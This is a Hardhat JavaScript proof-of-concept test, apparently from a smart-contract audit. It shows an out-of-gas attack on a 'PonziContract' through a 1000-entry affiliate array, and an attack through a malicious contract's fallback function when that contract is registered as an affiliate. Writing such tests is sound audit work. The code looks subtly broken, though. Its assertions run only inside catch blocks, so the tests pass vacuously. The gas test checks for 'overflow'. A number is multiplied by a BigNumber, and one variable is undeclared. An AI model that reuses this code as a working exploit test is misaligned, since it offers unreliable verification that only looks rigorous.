const { ethers } = require("hardhat");
const assert = require("assert");

describe("POC test", function () {
  let ponziContract;
  let maliciousContract;
  let owner;

  before(async function () {
    [owner] = await ethers.getSigners();
    [ownerAddr] = await Promise.all([owner.getAddress()]);
    const PonziContract = await ethers.getContractFactory("PonziContract");
    ponziContract = await PonziContract.deploy();
    await ponziContract.deployed();

    const MaliciousContract = await ethers.getContractFactory(
      "MaliciousContract"
    );
    maliciousContract = await MaliciousContract.deploy();
    await maliciousContract.deployed();
  });

  it("should demonstrate out-of-gas attack", async function () {
    const numAffiliates = 1000; // Add a large number of affiliates
    const affiliates = Array(numAffiliates).fill(owner.address);

    // Attempt to join with a large number of affiliates
    try {
      // Use a reasonable value for testing, e.g., 0.1 Ether
      await ponziContract.connect(owner).joinPonzi(affiliates, {
        value: numAffiliates * ethers.utils.parseEther("0.1"),
      });
    } catch (error) {
      console.log("Error:", error.message);
      // Ensure that the error message indicates out-of-gas
      assert(error.message.includes("overflow"), "Expected out of gas error");
    }
  });

  it("should demonstrate unintended transfer vulnerability", async function () {
    // Set malicious contract as an affiliate
    await ponziContract
      .connect(owner)
      .addNewAffilliate(maliciousContract.address);

    // Attempt to join, triggering malicious fallback function
    try {
      await ponziContract
        .connect(owner)
        .joinPonzi([maliciousContract.address], {
          value: ethers.utils.parseEther("1"),
        });
    } catch (error) {
      console.log("Error:", error.message);
      // Ensure that the error message indicates the malicious action
      assert(
        error.message.includes("revert"),
        "Expected revert due to malicious action"
      );
    }
  });
});
